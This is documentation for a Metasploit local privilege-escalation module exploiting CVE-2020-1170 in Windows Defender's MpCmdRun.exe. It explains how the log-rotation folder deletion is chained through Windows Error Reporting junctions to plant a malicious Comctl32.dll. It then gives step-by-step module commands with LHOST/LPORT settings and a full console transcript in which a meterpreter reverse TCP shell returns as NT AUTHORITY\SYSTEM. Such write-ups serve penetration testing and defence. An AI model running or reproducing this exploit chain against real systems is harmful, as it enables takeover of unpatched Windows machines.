## Vulnerable Application

An arbitrary folder deletion vulnerability exists in Windows Defender's MpCmdRun.exe binary up to and including the
latest version as of August 2020. The vulnerability occurs due to the fact Windows Defender does not apply impersonation when
it rotates its log files. Rotation of log files occurs when the size of C:\Windows\Temp\MpCmdRun.log is greater than or equal
to 16MB. When this occurs, the C:\Windows\Temp\MpCmdRun.log is renamed via a file move operation to
C:\Windows\Temp\MpCmdRun.log.bak. By creating a junction directory named C:\Windows\Temp\MpCmdRun.log.bak, and then filling
the contents of C:\Windows\Temp\MpCmdRun.log so that it is greater than 16 MB in size, attackers can delete an arbitrary folder
and its contents as the SYSTEM user.

To turn this into a LPE vulnerabilty, attackers can utilize a flaw within the Windows Error Reporting service, as described by @jonaslyk
of secret.club, whereby if the C:\ProgramData\Microsoft\Windows\WER directory does not exist (which is not normally the case), and a WER
error report is submitted, then the program C:\Windows\System32\wermgr.exe will run as SYSTEM and will create the
C:\ProgramData\Microsoft\Windows\WER directory with permissions that allow all local users to access it.

Attackers can redirect this directory creation operation using directory junctions to create the directory
C:\Windows\System32\wermgr.exe.local with the same open permissions. Once this is done, attackers can plant
a malicious DLL named Comctl32.dll in a version specific directory underneath C:\Windows\System32\wermgr.exe.local.
Now all the attacker has to do is submit a WER error report, which will cause wermgr.exe to load and run the contents of
the malicious Comctl32.dll as the SYSTEM user.

This module has been tested with Windows 10 v1909 x64 running MpCmdRun.exe version 4.18.1902.5 and is confirmed to work
with this version, however it has been updated to also include the patch bypasses from klinix5 (aka Abdelhamid Naceri),
and as this bypass has not been patched as of August 2020, its possible this module may work on later versions as well.

Note that this code uses the NtApiDotNet.dll library, version 1.1.28, which is taken directly from
https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases/tag/v1.1.28 as despite our best attempts,
it was not possible to get the file oplock code from this DLL ported into the framework via either PowerShell
or Railgun (both which had their own issues when it came to file oplocks). RDLLs were an option but considering we are
already dropping files on the host, it was decided that it was best to just drop the NtApiDotNet DLL, load this via
PowerShell, run the required operations, and then clean up this DLL and the other artifacts once we are done.

### Installation And Setup
All affected systems should have the Windows Defender installed. You will however need to make sure that no other
AV is active on the target system, or Windows Defender will be disabled. The exploit has a check for this in case
you forget though so you can check if Windows Defender is disabled or not. Testers will also need to be careful as
once Windows Defender is updated, there is no way to downgrade it again.

For these reasons testers are recommended to use a clean installation of Windows 10 v1903 or Windows 10 v1909, which should have
everything needed to test out this issue, and ensure that the target does not receive any updates. Just be sure that
the installed version of MpCmdRun.exe is a version prior to 4.18.2005.1.

## Verification Steps

1. Get a non-SYSTEM meterpreter session on any target running Windows Defender with no other AV active,
   and which has a MpCmdRun.exe file version of 4.18.2004.6 or earlier.
2. `use exploit/windows/local/cve_2020_1170_windows_defender_lpe.rb`
3. `set session <session>`
4. `set LHOST <ip address of the interface to listen on>`
5. `set LPORT <port to listen on>`
6. `set PowerShellWaitTime <time to wait for PowerShell script to run on target>`
7. `exploit`
8. Verify that you get a new shell running as SYSTEM

## Options
  ### WerWaitTime
  Time to wait for the file writes to complete before clearing the WER directory. On slower
  systems or those with lots of file activity, it is recommended to increase this number.

  ### WritableDir
  A directory that the current user can write to which will be used to store the contents of
  all the files and directories moved out of C:\ProgramData\Microsoft\Windows\WER so it can be
  deleted or turned into a directory junction when needed.

  ### PowerShellWaitTime
  The maximum amount of time to wait for the PowerShell script to run and perform
  the following operations before Metasploit will throw a time out error:

   1. Fill up the contents of C:\Windows\Temp\MpCmdRun.log and make
      its contents 16MB or larger so that the bug will be triggered
   2. Create the oplock and listen on it
   3. Perform the necessary file direct operations once the oplock has been triggered.
   4. Release the oplock once these operations have been done.

  As these operations can take some time to run, this setting is set to a default of 90 minutes.
  If the target system is running a slower processor or hard disk, it is recommended to increase
  this value to prevent time out issues.

## Scenarios

### Windows 10 v1903 x64 with MpCmdRun.exe version 4.18.1902.5

```
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                             Connection
  --  ----  ----                     -----------                             ----------
  1         meterpreter x64/windows  DESKTOP-EMAVUN1\test @ DESKTOP-EMAVUN1  0.0.0.0:0 -> 172.22.136.251:4444 (172.22.136.251)

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: DESKTOP-EMAVUN1\test
meterpreter > sysinfo
Computer        : DESKTOP-EMAVUN1
OS              : Windows 10 (10.0 Build 18363).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getsystem
[-] 2001: Operation failed: The environment is incorrect. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/windows/local/cve_2020_1170_windows_defender_lpe
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > show options

Module options (exploit/windows/local/cve_2020_1170_windows_defender_lpe):

   Name                Current Setting   Required  Description
   ----                ---------------   --------  -----------
   PowerShellWaitTime  90                yes       Maximum number of minutes to wait for the PowerShell script to run before timing out
   SESSION                               yes       The session to run this module on.
   WerWaitTime         30                yes       Number of seconds to wait for background file writes to complete before clearing the WER directory
   WritableDir         C:\Windows\Temp\  yes       The location of a directory the current user can write to


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows DLL Dropper


msf6 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > set PowerShellWaitTime 95
PowerShellWaitTime => 95
msf6 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > set LHOST 172.22.128.1
LHOST => 172.22.128.1
msf6 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > set LPORT 5522
LPORT => 5522
msf6 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > exploit

[*] Started reverse TCP handler on 172.22.128.1:5522
[*] Executing automatic check (disable AutoCheck to override)
[*] Version 4.18.1902.5 of MpCmdRun.exe detected on target!
[+] The target appears to be vulnerable.
[+] Uploaded necessary files and registered them for cleanup!
[+] Successfully moved the folders out of C:\ProgramData\Microsoft\Windows\WER!
[*] Triggering the vulnerability, this usually takes about 40 to 60 minutes to complete, but it can take longer on slower systems...
[+] Successfully triggered the arbitrary file deletion vulnerability!
[*] Sleeping for 30 seconds to ensure any extra operations on the WER directory go through before we try and clear it up.
[+] Successfully moved the folders out of C:\ProgramData\Microsoft\Windows\WER!
[+] Created the directory junction successfully!
[+] Created the symbolic link between \RPC Control\Temp and \??\c:\windows\system32\wermgr.exe.local successfully!
[*] Starting the WER job to create the C:\Windows\System32\wermgr.exe.local directory...
[+] Successfully created the WER job!
[+] Successfully created C:\Windows\System32\wermgr.exe.local\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.778_none_e6c6b761130d4fb8
[+] Successfully uploaded the malicious Comctl32.dll file!
[+] Successfully created C:\Windows\System32\wermgr.exe.local\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.1016_none_9e7a36bbe461dae4
[+] Successfully uploaded the malicious Comctl32.dll file!
[*] Sleeping for a few seconds to allow things to calm down...
[*] Starting the WER job to gain a shell...
[+] Successfully created the WER job!
[*] Sending stage (200262 bytes) to 172.22.136.251
[*] Meterpreter session 2 opened (172.22.128.1:5522 -> 172.22.136.251:50395) at 2020-08-27 13:24:25 -0500
[+] Deleted C:\Windows\Temp\\xemgyHO


[+] Deleted C:\Windows\Temp\\srKBGnsmZib
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-EMAVUN1
OS              : Windows 10 (10.0 Build 18363).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > sessions

Active sessions
===============

  Id  Name  Type                     Information                             Connection
  --  ----  ----                     -----------                             ----------
  1         meterpreter x64/windows  DESKTOP-EMAVUN1\test @ DESKTOP-EMAVUN1  0.0.0.0:0 -> 172.22.136.251:4444 (172.22.136.251)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DESKTOP-EMAVUN1   172.22.128.1:5522 -> 172.22.136.251:50395 (172.22.136.251)

msf6 exploit(windows/local/cve_2020_1170_windows_defender_lpe) >
```
